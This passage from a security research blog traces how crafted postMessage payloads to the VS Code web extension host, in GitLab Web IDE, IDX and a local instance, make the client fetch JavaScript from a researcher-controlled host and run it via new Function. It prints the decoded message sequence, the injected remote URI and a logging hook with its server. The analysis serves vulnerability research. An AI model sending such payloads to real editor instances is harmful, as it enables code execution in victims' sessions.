<span class="k">return</span><span class="p">}</span><span class="kd">function</span> <span class="nf">buf2hex</span><span class="p">(</span><span class="nx">buffer</span><span class="p">){</span><span class="k">return</span> <span class="p">[...</span><span class="k">new</span> <span class="nc">Uint8Array</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)].</span><span class="nf">map</span><span class="p">(</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">padStart</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">)).</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">);}</span><span class="nf">fetch</span><span class="p">(</span><span class="s2">`http://127.0.0.1:3000/save`</span><span class="p">,{</span><span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="na">body</span><span class="p">:</span><span class="nf">buf2hex</span><span class="p">(</span><span class="nx">S</span><span class="p">)});</span><span class="nx">a</span><span class="p">.</span><span class="nf">fire</span><span class="p">(</span><span class="nx">h</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715113610.png" alt="Pasted image 20250715113610.png" /></p>

<p>Then i decoded the logged hex messages but still couldn‚Äôt find anything related to resource part, tried the same in Gitlab it did appear there. So in case of Gitlab the vulnerable sink was automatically called but here in IDX it isn‚Äôt being called.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">decoder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TextDecoder</span><span class="p">(</span><span class="dl">"</span><span class="s2">utf-8</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">decode</span> <span class="o">=</span> <span class="nx">decoder</span><span class="p">.</span><span class="nx">decode</span><span class="p">.</span><span class="nf">bind</span><span class="p">(</span><span class="nx">decoder</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715125836.png" alt="Pasted image 20250715125836.png" />
<br />
<br /></p>

<p>Also another trick is to use Conditional breakpoint (if you don‚Äôt want to use match and replace), that code will be executed automatically when the bp is reached.
<br />
<br /></p>
<center><iframe width="560" height="315" src="https://www.youtube.com/embed/aDcK6Z6K2Zc?si=MWTgZC5WOr-0Yz-0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></center>
<p><br /></p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715130014.png" alt="Pasted image 20250715130014.png" />
<br />
<br />
‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äì</p>

<h2 id="analyzing-the-messages">Analyzing the Messages</h2>

<blockquote>

  <p>1st message</p>
</blockquote>

<p>It‚Äôs very long json string</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"commit"</span><span class="p">:</span><span class="s2">"91cf69e7f84d84beda2be5f9bbdd8a4f33000083"</span><span class="p">,</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"1.85.2"</span><span class="p">,</span><span class="nl">"quality"</span><span class="p">:</span><span class="s2">"stable"</span><span class="p">,</span><span class="nl">"parentPid"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"environment"</span><span class="p">:{</span><span class="nl">"isExtensionDevelopmentDebug"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"appName"</span><span class="p">:</span><span class="s2">"GitLab Web IDE"</span><span class="p">,</span><span class="nl">"appHost"</span><span class="p">:</span><span class="s2">"web"</span><span class="p">,</span><span class="nl">"appUriScheme"</span><span class="p">:</span><span class="s2">"gitlab-web-ide"</span><span class="p">,</span><span class="nl">"appLanguage"</span><span class="p">:</span><span class="s2">"en"</span><span class="p">,</span><span class="nl">"extensionTelemetryLogResource"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/20240504T182147/exthost/extensionTelemetry.log"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"VSCode-log"</span><span class="p">},</span><span class="nl">"isExtensionTelemetryLoggingOnly"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"globalStorageHome"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/User/globalStorage"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"VSCode-userdata"</span><span class="p">},</span><span class="nl">"workspaceStorageHome"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/User/workspaceStorage"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"VSCode-userdata"</span><span class="p">}},</span><span class="nl">"workspace"</span><span class="p">:{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"-261f9d5d"</span><span class="p">,</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"sub"</span><span class="p">,</span><span class="nl">"transient"</span><span class="p">:</span><span class="kc">false</span><span class="p">},</span><span class="nl">"consoleForward"</span><span class="p">:{</span><span class="nl">"includeStack"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"logNative"</span><span class="p">:</span><span class="kc">false</span><span class="p">},</span><span class="nl">"extensions"</span><span class="p">:{</span><span class="nl">"versionId"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"allExtensions"</span><span class="p">:[{</span><span class="nl">"identifier"</span><span class="p">:{</span><span class="nl">"value"</span><span class="p">:</span><span class="s2">"VSCode.bat"</span><span class="p">,</span><span class="nl">"_lower"</span><span class="p">:</span><span class="s2">"VSCode.bat"</span><span class="p">},</span><span class="nl">"isBuiltin"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"isUserBuiltin"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"isUnderDevelopment"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"extensionLocation"</span><span class="p">:{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/bat"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"https"</span><span class="p">,</span><span class="nl">"authority"</span><span class="p">:</span><span class="s2">"gitlab.com"</span><span class="p">},</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">"bat"</span><span class="p">,</span><span class="nl">"displayName"</span><span class="p">:</span><span class="s2">"Windows Bat Language Basics"</span><span class="p">,</span><span class="nl">"description"</span><span class="p">:</span><span class="s2">"Provides snippets, syntax highlighting, bracket matching and folding in Windows batch files."</span><span class="p">,</span><span class="nl">"version"</span><span class="p">:</span><span class="s2">"1.0.0"</span><span class="p">,</span><span class="nl">"publisher"</span><span class="p">:</span><span class="s2">"VSCode"</span><span class="p">,</span><span class="nl">"license"</span><span class="p">:</span><span class="s2">"MIT"</span><span class="p">,</span><span class="nl">"engines"</span><span class="p">:{</span><span class="s2">"
</span></code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715130747.png" alt="Pasted image 20250715130747.png" />
<br />
Based on the variable naming and all it sounds like it‚Äôs responsible for Initializing  VSCode with information related to such as extensions what all activation events are supported by them</p>

<p>Moving onto the next one</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x01\x00\x00\x00\x02H\x18$initializeConfiguration\x00\x01I\x05[{"defaults":{"contents":{"editor":{"tabSize":4,"indentSize":"tabSize","insertSpaces":true,"detectIndentation":true,"trimAutoWhitespace":true,"largeFileOptimizations":true,"wordBasedSuggestions":"matchingDocuments","semanticHighlighting":{"enabled":"configuredByTheme"},"stablePeek":false,"maxTokenizationLineLength":20000,"experimental":{"asyncTokenization":false,"asyncTokenizationLogging":false,"asyncTokenizationVerification":false,"dropIntoEditor":{"defaultProvider":{}}},"language"
</code></pre></div></div>

<p>Searching for <code class="language-plaintext highlighter-rouge">initializeConfiguration</code> we can see there is indeed a function with the same name, if we set a breakpoint there it actually gets hit</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250715135829.png" alt="Pasted image 20250715135829.png" />
<br /></p>
<blockquote>

  <p>3rd message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">initializeTelemetryLevel</code> method no idea what it does</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x03\x00\x00\x00\nÔøΩ\x19$initializeTelemetryLevel\x03\x01\x00\x00\x00\x010\x01\x00\x00\x00\x05false\x04'
</code></pre></div></div>

<blockquote>

  <p>4th message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">startExtensionHost</code> method</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x01\x00\x00\x00\x13[\x13$startExtensionHost\x00\x00\x00`[{"versionId":1,"toRemove":[],"toAdd":[],"addActivationEvents":{},"myToRemove":[],"myToAdd":[]}]'
</code></pre></div></div>

<blockquote>

  <p>5th message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">activateByEvent</code> method here it‚Äôs registering the event and the extension <code class="language-plaintext highlighter-rouge">gitlab-web-ide</code> needs to be invoked for that particular event <code class="language-plaintext highlighter-rouge">onAuthenticationRequest</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\x01\x00\x00\x00\x15[\x10$activateByEvent\x00\x00\x00,["onAuthenticationRequest:gitlab-web-ide",0]'
</code></pre></div></div>

<blockquote>

  <p>6th message:</p>
</blockquote>

<p>Calls <code class="language-plaintext highlighter-rouge">initializeWorkspace</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[{"isUntitled":false,"folders":[{"uri":{"$mid":1,"fsPath":"/sub","external":"gitlab
web-ide:/sub","path":"/sub","scheme":"gitlab-web
ide"},"name":"sub","index":0}],"id":"-261f9d5d","name":"sub","transient":false},true
 ]
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250724110921.png" alt="Pasted image 20250724110921.png" /></p>

<p>Null messages:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x07\x00\x00\x00\x01
\x07\x00\x00\x00\x02
\x07\x00\x00\x00\n
</code></pre></div></div>

<p>And the final message:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\t\x00\x00\x00\x11\x00\x00\x00O{"$mid":1,"path":"/gl/editor/include.js","scheme":"https","authority":"peo.si"}'
</code></pre></div></div>

<p>I am directly jumping to the final method where this message is handled:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="k">async</span> <span class="nf">vb</span><span class="p">(</span><span class="nx">$</span><span class="p">,</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">v</span> <span class="o">=</span> <span class="nx">v</span><span class="p">.</span><span class="nf">with</span><span class="p">({</span>
                        <span class="na">path</span><span class="p">:</span> <span class="nc">S</span><span class="p">(</span><span class="nx">v</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.js</span><span class="dl">"</span><span class="p">)</span>
                    <span class="p">});</span>
                    <span class="kd">const</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">$</span><span class="p">?.</span><span class="nx">identifier</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
                    <span class="nx">o</span> <span class="o">&amp;&amp;</span> <span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/willFetchExtensionCode/</span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
                    <span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">I</span><span class="p">.</span><span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">C</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">v</span><span class="p">))</span>
                      <span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">));</span>
                    <span class="k">if </span><span class="p">(</span><span class="nx">o</span> <span class="o">&amp;&amp;</span> <span class="nx">performance</span><span class="p">.</span><span class="nf">mark</span><span class="p">(</span><span class="s2">`code/extHost/didFetchExtensionCode/</span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
                    <span class="nx">r</span><span class="p">.</span><span class="nx">status</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span>
                        <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">statusText</span><span class="p">);</span>
                    <span class="kd">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">r</span><span class="p">.</span><span class="nf">text</span><span class="p">()</span>
                      <span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">v</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">)}</span><span class="s2">#VSCode-extension`</span>
                      <span class="p">,</span> <span class="nx">h</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">a</span><span class="p">}</span><span class="s2">
//# sourceURL=</span><span class="p">${</span><span class="nx">c</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
                    <span class="kd">let</span> <span class="nx">i</span><span class="p">;</span>
                    <span class="k">try</span> <span class="p">{</span>
                        <span class="nx">i</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">module</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">exports</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">,</span><span class="nx">h</span><span class="p">)</span>
                    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">throw</span> <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="nx">o</span> <span class="p">?</span> <span class="s2">`Loading code for extension </span><span class="p">${</span><span class="nx">o</span><span class="p">}</span><span class="s2"> failed: </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span> <span class="p">:</span> <span class="s2">`Loading code failed: </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`</span><span class="p">${</span><span class="nx">v</span><span class="p">.</span><span class="nf">toString</span><span class="p">(</span><span class="o">!</span><span class="mi">0</span><span class="p">)}${</span><span class="k">typeof</span> <span class="nx">b</span><span class="p">.</span><span class="nx">line</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span> <span class="p">?</span> <span class="s2">` line </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">line</span><span class="p">}</span><span class="s2">`</span> <span class="p">:</span> <span class="dl">""</span><span class="p">}${</span><span class="k">typeof</span> <span class="nx">b</span><span class="p">.</span><span class="nx">column</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">number</span><span class="dl">"</span> <span class="p">?</span> <span class="s2">` column </span><span class="p">${</span><span class="nx">b</span><span class="p">.</span><span class="nx">column</span><span class="p">}</span><span class="s2">`</span> <span class="p">:</span> <span class="dl">""</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
                        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="nx">b</span><span class="p">),</span>
                        <span class="nx">b</span>
                    <span class="p">}</span>
</code></pre></div></div>

<p>The arguments values passed to this method can be seen in the below ss
<img src="/tmp/cdn-images/Pasted%20image%2020250724111800.png" alt="Pasted image 20250724111800.png" />
<br />
The <code class="language-plaintext highlighter-rouge">v</code> variable contains the following, it looks same as what we passed arbitrarily but look at the authority  and path part they actually point to the original location of the extension resource.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">'</span><span class="p">{</span><span class="nl">"$mid"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nl">"path"</span><span class="p">:</span><span class="s2">"/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/gitlab-web-ide/main.js"</span><span class="p">,</span><span class="nl">"scheme"</span><span class="p">:</span><span class="s2">"https"</span><span class="p">,</span><span class="nl">"authority"</span><span class="p">:</span><span class="s2">"gitlab.com"</span><span class="p">}</span><span class="err">'</span><span class="w">
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">$</code> and <code class="language-plaintext highlighter-rouge">v</code>  argument value is actually  populated from the very first message remember that long ass json.</p>

<p>Not sure about <code class="language-plaintext highlighter-rouge">a</code> it contains a bunch of boolean values. If  I try to change the above values directly in the first message it does appear as it is at this function call. But the real magic is happening here</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="kd">const</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">I</span><span class="p">.</span><span class="nx">URI</span><span class="p">.</span><span class="nf">revive</span><span class="p">(</span><span class="k">await</span> <span class="k">this</span><span class="p">.</span><span class="nx">C</span><span class="p">.</span><span class="nf">$asBrowserUri</span><span class="p">(</span><span class="nx">v</span><span class="p">))</span>
</code></pre></div></div>

<p>If you do step in from here , you will end up at this line <code class="language-plaintext highlighter-rouge">u.fire(D)</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">decode</span><span class="p">(</span><span class="nx">D</span><span class="p">.</span><span class="nx">buffer</span><span class="p">)</span>
<span class="dl">'</span><span class="se">\t\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x11</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00O{"$mid":1,"path":"/gl/editor/include.js","scheme":"https","authority":"peo.si"}</span><span class="dl">'</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">The value returned by</code>await this.C.$asBrowserUri(v)<code class="language-plaintext highlighter-rouge">statement is this. After which the value is passed to</code>I.URI.revive`  method</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250724115251.png" alt="Pasted image 20250724115251.png" />
<br />
<code class="language-plaintext highlighter-rouge">new R</code> looks similar to <code class="language-plaintext highlighter-rouge">new URL</code> meant for parsing the url
The returned parsed url is then passed to fetch call eg <code class="language-plaintext highlighter-rouge">https://peo.si/gl/editor/include.js</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="kd">const</span> <span class="nx">ge</span> <span class="o">=</span> <span class="nx">F</span><span class="p">.</span><span class="nf">serializeRequest</span><span class="p">(</span><span class="nx">C</span><span class="p">,</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">K</span><span class="p">,</span> <span class="nx">z</span><span class="p">,</span> <span class="o">!!</span><span class="nx">L</span><span class="p">);</span>
                    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">f</span><span class="p">?.</span><span class="nf">logOutgoing</span><span class="p">(</span><span class="nx">ge</span><span class="p">.</span><span class="nx">byteLength</span><span class="p">,</span> <span class="nx">C</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">`request: </span><span class="p">${(</span><span class="mi">0</span><span class="p">,</span>
                    <span class="nx">R</span><span class="p">.</span><span class="nx">$Dv</span><span class="p">)(</span><span class="nx">O</span><span class="p">)}</span><span class="s2">.</span><span class="p">${</span><span class="nx">K</span><span class="p">}</span><span class="s2">(`</span><span class="p">,</span> <span class="nx">U</span><span class="p">),</span>
                    <span class="k">this</span><span class="p">.</span><span class="nx">c</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">ge</span><span class="p">),</span>
                <span class="nf">decode</span><span class="p">(</span><span class="nx">ge</span><span class="p">.</span><span class="nx">buffer</span><span class="p">)</span>
<span class="dl">'</span><span class="se">\</span><span class="s1">x01</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x11/</span><span class="se">\r</span><span class="s1">$asBrowserUri</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00</span><span class="se">\</span><span class="s1">x00ÔøΩ[{"$mid":1,"path":"/assets/webpack/gitlab-VSCode/0.0.1-dev-20240501001436/VSCode/extensions/gitlab-web-ide/mains.js","scheme":"https","authority":"gitlab.com"}]</span><span class="dl">'</span>
</code></pre></div></div>

<p>Rest of the code flow is simple it makes a request to that url (which is full controlled by us) , the response is then added to the <code class="language-plaintext highlighter-rouge">h</code> variable which is later passed to <code class="language-plaintext highlighter-rouge">new Function</code> later when this method will be called it will execute whatever code was returned in the response</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">new</span> <span class="nc">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">module</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">exports</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">require</span><span class="dl">"</span><span class="p">,</span><span class="nx">h</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250724122029.png" alt="Pasted image 20250724122029.png" /></p>

<hr />

<p>To demonstrate the pitfalls in detail I will be taking example of a local VSCode web instance as IDX has made some changes and I don‚Äôt have proper notes so can‚Äôt explain properly. It means I will be reproducing my own bug from past figuring out what I did why I did.</p>

<p>After setting up the VSCode web server up , if we pass the same hex data in this. The breakpoint doesn‚Äôt hits not even for the <code class="language-plaintext highlighter-rouge">initializeConfiguration</code> method .</p>

<p>Based on this it seemed each instance have it‚Äôs own configuration the important thing is in the very first message that long ass json value (I will explain the exact root cause later which I figured out while writing this blogpost, for the time being just follow along).</p>

<p>By setting breakpoint to see what original values are being passed there and replace that value in our hex payload file</p>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725115714.png" alt="Pasted image 20250725115714.png" />
<br />
As I wasn‚Äôt sure why it‚Äôs failing, I decided to do the same as earlier Matan did, log the messages and used them as a base.</p>

<p>And here‚Äôs the web server which basically saves the body into a file.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access-Control-Allow-Origin</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access-Control-Allow-Methods</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">POST, GET, OPTIONS</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">header</span><span class="p">(</span><span class="dl">"</span><span class="s2">Access-Control-Allow-Headers</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Origin, X-Requested-With, Content-Type, Accept</span><span class="dl">"</span><span class="p">);</span>
    <span class="nf">next</span><span class="p">();</span>
    <span class="p">});</span>


<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello World!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">});</span>

<span class="c1">// define a route to handle POST body payload parameter and the save the content to a file ,keep on appending to the same file when recieving new  data</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/save</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">body</span> <span class="o">+=</span> <span class="nx">data</span><span class="p">;</span>
        <span class="p">});</span>
    <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">end</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">fs</span><span class="p">.</span><span class="nf">appendFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">mesage.txt</span><span class="dl">'</span><span class="p">,</span> <span class="nx">body</span> <span class="o">+</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">The "data to append" was appended to file!</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">});</span>
        <span class="p">});</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Data saved to file</span><span class="dl">'</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Example app listening on port 3000!</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">});</span>

</code></pre></div></div>

<p>In message.txt from my local VSCode web instance, I could again see nothing related to extension calls like it was in Gitlab which was cool as it made it similar to IDX case.</p>

<p>From the minified Gitlab poc we are aware of the important request messages which we need to sent, the payload to make it fetch the extension url from our server</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$startExtensionHost &gt;
$activateByEvent &gt;
$initializeWorkspace &gt;

[...]
O{"$mid":1,"path":"/1.js","scheme":"https","authority":"sudistark.github.io"}
</code></pre></div></div>

<p>First I will ensure if I am able to reach the <code class="language-plaintext highlighter-rouge">$startExtensionHost</code> method or not with the message.txt file and yeah it seemed to work. Next goal was to add the <code class="language-plaintext highlighter-rouge">$activateByEvent</code> message which is sent just after the <code class="language-plaintext highlighter-rouge">$startExtensionHost</code>.</p>

<p>I copied this from Github:
<em>onStartupFinished</em> is registered by the Merge Conflict extension</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$activateByEvent,["onStartupFinished",0]
</code></pre></div></div>

<p><img src="/tmp/cdn-images/Pasted%20image%2020250725182206.png" alt="Pasted image 20250725182206.png" />
<br />
After this it should call the code block which is responsible for fetching the extension source.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                <span class="k">async</span> <span class="nf">vb</span><span class="p">(</span><span class="nx">$</span><span class="p">,</span> <span class="nx">v</span><span class="p">,</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">v</span> <span class="o">=</span> <span class="nx">v</span><span class="p">.</span><span class="nf">with</span><span class="p">({</span>
